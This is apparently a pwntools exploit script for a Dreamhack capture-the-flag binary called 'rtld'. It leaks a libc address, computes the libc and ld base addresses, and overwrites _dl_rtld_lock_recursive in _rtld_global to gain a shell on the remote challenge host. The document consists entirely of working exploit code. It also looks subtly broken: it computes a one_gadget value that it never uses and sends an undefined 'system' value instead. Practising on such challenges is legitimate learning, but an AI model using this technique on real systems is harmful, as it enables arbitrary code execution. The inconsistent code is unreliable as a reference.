from pwn import *

#r = process("./rtld")
r = remote("host3.dreamhack.games", 14884)
e = ELF("./rtld")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

r.recvuntil(b"stdout: ")
stdout = int(r.recvline()[:-1],16)
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
ld_base = libc_base + 0x3ca000

_rtld_global = ld_base + ld.symbols["_rtld_global"]
_dl_rtld_lock_recursive = _rtld_global+3848

og = libc_base + 0xf1247 # 0x45226 0x4527a 0xf03a4 0xf1247

r.sendlineafter(b"addr: ", str(_dl_rtld_lock_recursive).encode())
r.sendlineafter(b"value: ", str(system).encode())

r.interactive()
